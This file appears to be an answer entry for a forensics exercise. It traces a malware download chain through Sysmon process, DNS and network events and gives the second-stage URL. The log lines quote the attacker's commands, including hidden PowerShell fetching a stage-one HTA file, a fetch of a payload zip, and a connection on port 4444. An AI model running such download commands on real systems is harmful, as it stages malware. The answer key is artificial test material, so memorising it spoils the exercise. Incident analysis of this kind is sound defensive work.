@@ -1,0 +1,20 @@
+Q7. What is the complete URL of the next file downloaded?
+========================================================================
+Method: Event ID 1 (CommandLine) + Event ID 22 (DNS) + Event ID 3 (connection)
+Answer: Download URL (2nd stage): http://cdn.malicious-update.io:8080/payload/final_stage.zip
+            first seen at 2023-08-14 09:13:31.000
+            initial stage was http://192.168.56.104:8080/stage1.hta (see Q2)
+
+SUPPORTING EVENTS
+------------------------------------------------------------------------
+URLs in chronological order:
+  1. 2023-08-14 09:12:40.222  http://192.168.56.104:8080/stage1.hta
+       via [EID 1 Process creation] | 2023-08-14 09:12:40.222 | Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | CommandLine=powershell.exe -nop -w hidden -c Invoke-WebRequest -Uri http://192.168.56.104:8080/stage1.hta -OutFile C:\Users\jdoe\AppData\Local\Temp\stage1.hta
+  2. 2023-08-14 09:13:31.000  http://cdn.malicious-update.io:8080/payload/final_stage.zip
+       via [EID 1 Process creation] | 2023-08-14 09:13:31.000 | Image=C:\Users\jdoe\AppData\Local\Temp\update.exe | CommandLine=update.exe --fetch http://cdn.malicious-update.io:8080/payload/final_stage.zip
+
+DNS query -> [EID 22 DNS query] | 2023-08-14 09:13:30.000 | Image=C:\Users\jdoe\AppData\Local\Temp\update.exe | QueryResults=type:  5 192.168.56.104;
+network connection -> [EID 3 Network connection] | 2023-08-14 09:12:41.010 | Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | DestinationPort=8080
+network connection -> [EID 3 Network connection] | 2023-08-14 09:13:32.000 | Image=C:\Users\jdoe\AppData\Local\Temp\update.exe | DestinationPort=8080
+network connection -> [EID 3 Network connection] | 2023-08-14 09:14:03.000 | Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | DestinationPort=4444
+network connection -> [EID 3 Network connection] | 2023-08-14 09:15:00.000 | Image=C:\Program Files\Mozilla Firefox\firefox.exe | DestinationPort=443
